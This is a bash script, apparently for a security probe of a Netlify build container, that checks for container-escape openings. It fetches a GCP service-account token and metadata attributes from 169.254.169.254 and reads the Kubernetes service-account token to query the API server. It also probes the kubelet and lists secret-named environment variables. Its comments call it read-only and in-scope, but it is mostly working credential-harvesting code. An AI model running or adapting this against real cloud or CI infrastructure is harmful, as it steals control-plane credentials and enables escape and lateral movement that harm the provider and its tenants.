#!/usr/bin/env bash
# Netlify build-container recon — IN-SCOPE escalations only (privesc/root, secrets-beyond-user,
# container escape, orchestration control-plane). Read-only, bounded, no disruption.
echo "===== NETLIFY BUILD PROBE $(date -u) ====="
echo "## identity/kernel"; id; uname -a; cat /etc/os-release 2>/dev/null | head -3; echo "cwd=$(pwd)"
echo "## caps + ns + cgroup"; grep -E 'Cap(Eff|Prm|Bnd)' /proc/self/status; readlink /proc/self/ns/* 2>/dev/null | sort -u; cat /proc/1/cgroup 2>/dev/null | head; cat /proc/self/cgroup 2>/dev/null|head
echo "## mounts (host/docker/k8s hints)"; grep -iE 'docker|containerd|kube|secret|overlay|/dev/(vd|sd|nvme)|hostpath|gcs' /proc/self/mountinfo 2>/dev/null | head -30
echo "## escape surface"; ls -la /var/run/docker.sock /run/containerd/containerd.sock /run/docker.sock 2>/dev/null; echo "core_pattern: $(cat /proc/sys/kernel/core_pattern 2>/dev/null)"; ls -la /dev/mem /dev/kmsg 2>/dev/null; echo "devmem_write:"; (echo -n '' >/dev/mem) 2>&1 | head -1
echo "## == GCP METADATA (control-plane creds) =="
M="http://169.254.169.254/computeMetadata/v1"; H="Metadata-Flavor: Google"
curl -s -m6 -H "$H" "$M/project/project-id"; echo
curl -s -m6 -H "$H" "$M/instance/service-accounts/default/email"; echo
echo "scopes:"; curl -s -m6 -H "$H" "$M/instance/service-accounts/default/scopes"
echo "token (first 40 chars only in report):"; curl -s -m6 -H "$H" "$M/instance/service-accounts/default/token" | head -c 60; echo
echo "attrs recursive (secrets?):"; curl -s -m6 -H "$H" "$M/instance/attributes/?recursive=true" | head -c 800; echo
echo "project attrs:"; curl -s -m6 -H "$H" "$M/project/attributes/?recursive=true" | head -c 400; echo
echo "## == KUBERNETES =="
env | grep -iE 'KUBERNETES|KUBE_' | head
ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null
echo "ns: $(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)"
echo "sa-token present: $([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo YES || echo no)"
KH=${KUBERNETES_SERVICE_HOST:-kubernetes.default.svc}
echo "apiserver whoami:"; curl -sk -m6 -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)" "https://$KH/apis/authentication.k8s.io/v1/selfsubjectreviews" -X POST -H 'Content-Type: application/json' -d '{"apiVersion":"authentication.k8s.io/v1","kind":"SelfSubjectReview"}' 2>&1 | head -c 400; echo
echo "kubelet :10250:"; curl -sk -m4 "https://127.0.0.1:10250/pods" 2>&1 | head -c 120; echo
echo "## == SECRETS BEYOND MY USER =="
env | grep -iE 'secret|token|key|passw|cred|aws|gcp|api' | sed 's/=.*/=<redacted>/' | head -30
ls -la /opt/build-bin /opt/buildhome 2>/dev/null | head
echo "## network"; ip -o a 2>/dev/null | awk '{print $2,$4}'; cat /etc/resolv.conf 2>/dev/null | grep -i nameserver
echo "===== END PROBE ====="
